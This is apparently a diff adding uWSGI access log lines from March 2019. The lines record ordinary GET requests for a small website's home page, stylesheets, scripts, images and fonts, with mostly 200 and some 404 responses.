+[pid: 18375|app: 0|req: 27/34] 114.216.151.15 () {52 vars in 852 bytes} [Sat Mar 23 04:33:17 2019] GET /static/images/iron.ico => generated 38078 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 28/35] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 05:10:06 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 29/36] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 05:12:08 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 30/37] 114.216.151.15 () {52 vars in 855 bytes} [Sat Mar 23 05:12:09 2019] GET /static/css/style.css => generated 56231 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 31/38] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 05:12:10 2019] GET /static/images/contact.jpg => generated 248074 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 32/39] 114.216.151.15 () {48 vars in 791 bytes} [Sat Mar 23 05:12:11 2019] GET /static/images/arr.png => generated 861 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 33/40] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 05:12:11 2019] GET /static/images/close.png => generated 499 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 285 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 34/41] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 05:12:11 2019] GET /static/images/arrows.png => generated 4243 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 35/42] 119.103.130.56 () {48 vars in 1000 bytes} [Sat Mar 23 05:59:38 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 36/43] 119.103.130.56 () {48 vars in 941 bytes} [Sat Mar 23 05:59:39 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 37/44] 119.103.130.56 () {48 vars in 947 bytes} [Sat Mar 23 05:59:39 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 38/45] 119.103.130.56 () {48 vars in 939 bytes} [Sat Mar 23 05:59:39 2019] GET /static/css/chocolat.css => generated 1951 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 39/46] 119.103.130.56 () {48 vars in 963 bytes} [Sat Mar 23 05:59:39 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 40/47] 119.103.130.56 () {48 vars in 933 bytes} [Sat Mar 23 05:59:39 2019] GET /static/css/style.css => generated 56231 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 41/48] 119.103.130.56 () {48 vars in 942 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 42/49] 119.103.130.56 () {48 vars in 936 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 43/50] 119.103.130.56 () {48 vars in 932 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 44/51] 119.103.130.56 () {48 vars in 920 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/move-top.js => generated 1330 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 45/52] 119.103.130.56 () {48 vars in 916 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 46/53] 119.103.130.56 () {48 vars in 934 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 47/54] 119.103.130.56 () {48 vars in 944 bytes} [Sat Mar 23 05:59:40 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 48/55] 119.103.130.56 () {48 vars in 935 bytes} [Sat Mar 23 05:59:41 2019] GET /static/css/italic.css => generated 12217 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 49/56] 119.103.130.56 () {48 vars in 935 bytes} [Sat Mar 23 05:59:41 2019] GET /static/css/family.css => generated 3082 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 50/57] 119.103.130.56 () {48 vars in 912 bytes} [Sat Mar 23 05:59:41 2019] GET /static/js/main.js => generated 3260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 51/58] 119.103.130.56 () {48 vars in 944 bytes} [Sat Mar 23 05:59:41 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 52/59] 119.103.130.56 () {48 vars in 942 bytes} [Sat Mar 23 05:59:41 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 53/60] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:41 2019] GET /static/images/t3.jpg => generated 29498 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 54/61] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:41 2019] GET /static/images/g8.jpg => generated 68073 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 55/62] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:41 2019] GET /static/images/t2.jpg => generated 66622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 56/63] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:41 2019] GET /static/images/c3.png => generated 14458 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 57/64] 119.103.130.56 () {50 vars in 1035 bytes} [Sat Mar 23 05:59:41 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 58/65] 119.103.130.56 () {50 vars in 1035 bytes} [Sat Mar 23 05:59:41 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 71896 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 59/66] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/g2.jpg => generated 95899 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 60/67] 119.103.130.56 () {48 vars in 999 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/banner1.jpg => generated 246709 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 61/68] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/g4.jpg => generated 49663 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 62/69] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/g5.jpg => generated 49342 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 63/70] 119.103.130.56 () {48 vars in 991 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/g10.jpg => generated 84108 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 64/71] 119.103.130.56 () {48 vars in 1017 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/arrows.png => generated 4243 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 65/72] 119.103.130.56 () {48 vars in 1011 bytes} [Sat Mar 23 05:59:42 2019] GET /static/images/arr.png => generated 861 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 66/73] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:43 2019] GET /static/images/c2.png => generated 21112 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 67/74] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:43 2019] GET /static/images/c1.png => generated 21632 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 68/75] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:43 2019] GET /static/images/g9.jpg => generated 61907 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 69/76] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:44 2019] GET /static/images/t1.jpg => generated 57504 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 70/77] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:44 2019] GET /static/images/g3.jpg => generated 56577 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 71/78] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:44 2019] GET /static/images/g6.jpg => generated 55401 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 72/79] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:44 2019] GET /static/images/t4.jpg => generated 31577 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 73/80] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:44 2019] GET /static/images/g7.jpg => generated 76447 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 74/81] 119.103.130.56 () {48 vars in 991 bytes} [Sat Mar 23 05:59:45 2019] GET /static/images/g11.jpg => generated 92351 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 75/82] 119.103.130.56 () {48 vars in 989 bytes} [Sat Mar 23 05:59:45 2019] GET /static/images/g1.jpg => generated 63558 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 76/83] 119.103.130.56 () {48 vars in 991 bytes} [Sat Mar 23 05:59:45 2019] GET /static/images/g12.jpg => generated 98137 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 77/84] 119.103.130.56 () {48 vars in 1019 bytes} [Sat Mar 23 05:59:45 2019] GET /static/images/contact.jpg => generated 248074 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 78/85] 119.103.130.56 () {48 vars in 1015 bytes} [Sat Mar 23 05:59:45 2019] GET /static/images/close.png => generated 499 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 285 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 79/86] 119.103.130.56 () {48 vars in 993 bytes} [Sat Mar 23 05:59:48 2019] GET /static/images/iron.ico => generated 38078 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 80/87] 23.236.117.8 () {44 vars in 689 bytes} [Sat Mar 23 06:05:12 2019] GET / => generated 19519 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 81/88] 23.236.117.8 () {44 vars in 689 bytes} [Sat Mar 23 06:05:13 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 82/89] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 06:07:02 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 83/90] 114.216.151.15 () {44 vars in 720 bytes} [Sat Mar 23 06:09:15 2019] GET /static/css/bootstrap.css.map => generated 232 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 84/91] 51.15.80.14 () {40 vars in 509 bytes} [Sat Mar 23 06:28:20 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 85/92] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 06:55:25 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 86/93] 114.216.151.15 () {50 vars in 830 bytes} [Sat Mar 23 06:57:16 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 87/94] 114.216.151.15 () {52 vars in 852 bytes} [Sat Mar 23 06:57:17 2019] GET /static/images/iron.ico => generated 38078 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 88/95] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 06:58:01 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 89/96] 114.216.151.15 () {48 vars in 788 bytes} [Sat Mar 23 06:58:01 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 90/97] 114.216.151.15 () {48 vars in 780 bytes} [Sat Mar 23 06:58:03 2019] GET /static/css/chocolat.css => generated 1951 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 1)
+[pid: 18374|app: 0|req: 8/98] 114.216.151.15 () {48 vars in 804 bytes} [Sat Mar 23 06:58:04 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 0)
+[pid: 18374|app: 0|req: 9/99] 114.216.151.15 () {48 vars in 774 bytes} [Sat Mar 23 06:58:06 2019] GET /static/css/style.css => generated 56231 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 2)
+[pid: 18374|app: 0|req: 10/100] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 06:58:10 2019] GET / => generated 19519 bytes in 40 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 91/101] 114.216.151.15 () {48 vars in 782 bytes} [Sat Mar 23 06:58:11 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 1)
+[pid: 18374|app: 0|req: 11/102] 114.216.151.15 () {48 vars in 776 bytes} [Sat Mar 23 06:58:12 2019] GET /static/css/italic.css => generated 12217 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 12/103] 114.216.151.15 () {52 vars in 852 bytes} [Sat Mar 23 06:58:12 2019] GET /static/css/style.css => generated 1 bytes in 1 msecs (HTTP/1.1 206) 9 headers in 351 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 92/104] 114.216.151.15 () {48 vars in 776 bytes} [Sat Mar 23 06:58:12 2019] GET /static/css/family.css => generated 3082 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 13/105] 114.216.151.15 () {52 vars in 852 bytes} [Sat Mar 23 06:58:13 2019] GET /static/css/style.css => generated 40195 bytes in 51 msecs (HTTP/1.1 206) 9 headers in 355 bytes (2151 switches on core 2)
+[pid: 18375|app: 0|req: 93/106] 114.216.151.15 () {48 vars in 783 bytes} [Sat Mar 23 06:58:13 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 14/107] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:14 2019] GET /static/images/c3.png => generated 14458 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 94/108] 114.216.151.15 () {48 vars in 804 bytes} [Sat Mar 23 06:58:15 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 95/109] 114.216.151.15 () {48 vars in 777 bytes} [Sat Mar 23 06:58:16 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 96/110] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 06:58:17 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 97/111] 114.216.151.15 () {48 vars in 757 bytes} [Sat Mar 23 06:58:17 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 98/112] 114.216.151.15 () {48 vars in 775 bytes} [Sat Mar 23 06:58:18 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 18374|app: 0|req: 15/113] 114.216.151.15 () {48 vars in 761 bytes} [Sat Mar 23 06:58:18 2019] GET /static/js/move-top.js => generated 1330 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 99/114] 114.216.151.15 () {48 vars in 785 bytes} [Sat Mar 23 06:58:18 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 100/115] 114.216.151.15 () {48 vars in 753 bytes} [Sat Mar 23 06:58:19 2019] GET /static/js/main.js => generated 3260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 101/116] 114.216.151.15 () {48 vars in 785 bytes} [Sat Mar 23 06:58:19 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 102/117] 114.216.151.15 () {48 vars in 783 bytes} [Sat Mar 23 06:58:19 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 103/118] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:19 2019] GET /static/images/c1.png => generated 21632 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 104/119] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:20 2019] GET /static/images/c2.png => generated 21112 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 105/120] 114.216.151.15 () {50 vars in 872 bytes} [Sat Mar 23 06:58:20 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 106/121] 114.216.151.15 () {48 vars in 823 bytes} [Sat Mar 23 06:58:21 2019] GET /static/images/arrows.png => generated 4243 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 107/122] 114.216.151.15 () {50 vars in 872 bytes} [Sat Mar 23 06:58:22 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 71896 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 108/123] 114.216.151.15 () {48 vars in 817 bytes} [Sat Mar 23 06:58:22 2019] GET /static/images/arr.png => generated 861 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 109/124] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:22 2019] GET /static/images/t1.jpg => generated 57504 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 110/125] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:23 2019] GET /static/images/t2.jpg => generated 66622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 111/126] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:23 2019] GET /static/images/t3.jpg => generated 29498 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 112/127] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:24 2019] GET /static/images/t4.jpg => generated 31577 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 113/128] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:25 2019] GET /static/images/g1.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 114/129] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:25 2019] GET /static/images/g3.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 115/130] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:25 2019] GET /static/images/g2.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 116/131] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:26 2019] GET /static/images/g4.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 117/132] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:26 2019] GET /static/images/g5.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 118/133] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:26 2019] GET /static/images/g6.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 119/134] 114.216.151.15 () {48 vars in 805 bytes} [Sat Mar 23 06:58:26 2019] GET /static/images/banner1.jpg => generated 246709 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 120/135] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:26 2019] GET /static/images/g7.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 121/136] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:27 2019] GET /static/images/g8.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 122/137] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 06:58:27 2019] GET /static/images/g9.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 123/138] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 06:58:27 2019] GET /static/images/g10.jpg => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 124/139] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 06:58:27 2019] GET /static/images/g11.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 125/140] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 06:58:27 2019] GET /static/images/g12.jpg => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 126/141] 114.216.151.15 () {48 vars in 825 bytes} [Sat Mar 23 06:58:27 2019] GET /static/images/contact.jpg => generated 248074 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 127/142] 114.216.151.15 () {48 vars in 821 bytes} [Sat Mar 23 06:58:28 2019] GET /static/images/close.png => generated 499 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 285 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 128/143] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 06:58:31 2019] GET /static/images/iron.ico => generated 38078 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 129/144] 114.216.151.15 () {44 vars in 720 bytes} [Sat Mar 23 06:59:09 2019] GET /static/css/bootstrap.css.map => generated 232 bytes in 4 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 130/145] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 07:06:21 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 131/146] 80.82.77.33 () {42 vars in 634 bytes} [Sat Mar 23 07:13:42 2019] GET / => generated 19519 bytes in 9 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
